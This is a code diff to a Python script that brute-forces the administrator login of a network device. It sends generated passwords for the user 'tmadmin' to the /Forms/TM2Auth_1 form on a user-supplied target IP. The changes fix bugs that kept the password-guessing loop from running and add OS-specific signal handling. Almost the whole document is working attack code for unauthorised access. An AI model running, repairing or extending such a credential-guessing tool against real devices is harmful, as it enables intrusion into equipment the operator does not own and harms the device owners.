@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 
 import signal
+import os
 import requests
 from requests.exceptions import ConnectionError
 
@@ -20,14 +21,15 @@ def gene(x):
     return 'Adm@' + res.upper()
 
 def task(target):
-    while not req.Empty() or success:
+    global success
+    while not req.empty() or success:
         content = gene(req.get())
         payload = {
             'LoginNameValue' : 'tmadmin',
             'LoginPasswordValue' : content, }
         
         try:
-            r = request.post('http://' + target + '/Forms/TM2Auth_1',
+            r = requests.post('http://' + target + '/Forms/TM2Auth_1',
                              data=payload, allow_redirects=False,
                              timeout=60)
             location = r.headers['Location']
@@ -46,7 +48,9 @@ def scheduler():
         
 if __name__ == '__main__' :
     target = str(raw_input('Target IP: '))
-    Greenlet.signal(signal.SIGQUIT, gevent.shutdown)
+    if os.name == 'nt':
+        Greenlet.signal(signal.SIGINT, Greenlet.kill)
+    else:
+        Greenlet.signal(signal.SIGQUIT, Greenlet.kill)
     Greenlet.spawn(scheduler).join()
     Greenlet.joinall([Greenlet.spawn(task, target)])
-    
